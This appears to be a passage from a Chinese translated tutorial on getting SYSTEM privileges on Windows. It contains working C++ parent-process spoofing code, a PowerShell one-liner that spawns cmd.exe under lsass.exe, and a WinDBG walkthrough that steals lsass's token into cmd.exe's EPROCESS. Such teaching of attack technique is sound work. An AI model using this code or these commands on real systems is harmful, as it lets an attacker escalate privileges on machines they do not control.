    if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == 0) {
    printf("Error opening PID %dn", pid);
    return 2;
    }
    // Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
    GetProcessHeap(),
    0,
    size
    );
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    // Finally, create the process
    ret = CreateProcessA(
    "C:\Windows\system32\cmd.exe", 
    NULL,
    NULL, 
    NULL, 
    true, 
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, 
    NULL,
    NULL, 
    reinterpret_cast(&si), 
    &pi
    );
    if (ret == false) {
    printf("Error creating new process (%d)n", GetLastError());
    return 3;
    }
编译后，我们就可以通过它启动一个进程，并继承父进程的访问令牌，这样就能够以system身份运行诸如 **lsass.exe** 之类的程序了：
这个技术的的来源在这里（链接地址：
）。
另外，NtObjectManager（链接地址：
）提供了一个非常简单的方法来实现这个效果，不过它使用的是Powershell：
    New-Win32Process cmd.exe -CreationFlags Newconsole -ParentProcess (Get-NtProcess -Name lsass.exe)
**通过内核获取SYSTEM权限**
好吧，这个技术只是用来玩的，没有实战价值……但是，从某方面来说，它却可以用来展示Windows的进程令牌管理机制。
通常情况下，Windows内核提权利用代码会篡改内核地址空间中的进程结构，以便修改进程令牌。例如，在广为人知的MS15-010漏洞利用代码（在exploit-db中可以找到）中，我们可以看到许多操作访问令牌的引用。
为了对这种方法进行分析，我们将在Windows 7 x64虚拟机上使用WinDBG来考察如何通过操作内核结构提升我们cmd.exe进程的权限。
一旦连接了WinDBG，首先需要收集想要升级到SYSTEM权限的、正在运行的进程的相关信息。为此，可以使用!process命令：
!process 0 0 cmd.exe
返回后，可以看到与我们的进程有关的一些重要信息，例如打开句柄的数量以及进程环境块的地址：
    PROCESS fffffa8002edd580
        SessionId: 1  Cid: 0858    Peb: 7fffffd4000  ParentCid: 0578
        DirBase: 09d37000  ObjectTable: fffff8a0012b8ca0  HandleCount:  21.
        Image: cmd.exe
根据我们的目的，我们感兴趣的东西是它提供的PROCESS地址（在这个例子中是fffffa8002edd580），它实际上是一个指向EPROCESS结构的指针。
EPROCESS结构（根据Microsoft的文档（链接地址： ）称）中含有进程的各种重要信息，例如进程ID和对进程线程的引用。
在该结构的许多字段中有一个指向进程的访问令牌的指针，具体要看在TOKEN结构中定义。为了查看令牌的内容，首先需要计算出TOKEN的地址。 在Windows
7 x64上，进程TOKEN位于偏移量0x208处，当然，对于Windows的不同版本（以及可能的服务包）来说，这个地址会有所不同。
我们可以用下面的命令来查找这个指针：
    kd> dq fffffa8002edd580+0x208 L1
该命令将会返回令牌地址，具体如下所示：
    fffffa80`02edd788  fffff8a0`00d76c51
由于令牌地址是在EX_FAST_REF结构中引用的，因此我们必须对该值进行AND运算，才能获得真正的指针地址：
    kd> ? fffff8a0`00d76c51 & ffffffff`fffffff0
    Evaluate expression: -8108884136880 = fffff8a0`00d76c50
这意味着cmd.exe的TOKEN的真正地址是fffff8a000d76c50。 接下来，我们可以使用以下命令为我们的进程转储TOKEN结构成员：
    kd> !token fffff8a0`00d76c50
下面，我们看看进程令牌中的信息：
    User: S-1-5-21-3262056927-4167910718-262487826-1001
    User Groups:
     00 S-1-5-21-3262056927-4167910718-262487826-513
        Attributes - Mandatory Default Enabled
     01 S-1-1-0
        Attributes - Mandatory Default Enabled
     02 S-1-5-32-544
        Attributes - DenyOnly
     03 S-1-5-32-545
        Attributes - Mandatory Default Enabled
     04 S-1-5-4
        Attributes - Mandatory Default Enabled
     05 S-1-2-1
        Attributes - Mandatory Default Enabled
     06 S-1-5-11
        Attributes - Mandatory Default Enabled
     07 S-1-5-15
        Attributes - Mandatory Default Enabled
     08 S-1-5-5-0-2917477
        Attributes - Mandatory Default Enabled LogonId
     09 S-1-2-0
        Attributes - Mandatory Default Enabled
     10 S-1-5-64-10
        Attributes - Mandatory Default Enabled
     11 S-1-16-8192
        Attributes - GroupIntegrity GroupIntegrityEnabled
    Primary Group: S-1-5-21-3262056927-4167910718-262487826-513
    Privs:
     19 0x000000013 SeShutdownPrivilege               Attributes -     23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default
     25 0x000000019 SeUndockPrivilege                 Attributes -     33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes -     34 0x000000022 SeTimeZonePrivilege               Attributes -
那么，我们如何才能将自己的进程的权限提升到SYSTEM级别呢？实际上，我们只需要从另一个具有SYSTEM特权的进程（比如lsass.exe）中窃取这个令牌，然后使用以下命令将其粘贴到我们的cmd.exe的EPROCESS中即可：
    kd> !process 0 0 lsass.exe
    kd> dq +0x208 L1
    kd> ?  & FFFFFFFF`FFFFFFF0
    kd> !process 0 0 cmd.exe
    kd> eq  
为了让读者观看上述技术在实际系统上的运行情况，我特意录制了一段视频，生动展示了 **CMD.EXE** 从低级用户权限提升至 **SYSTEM**
权限的过程：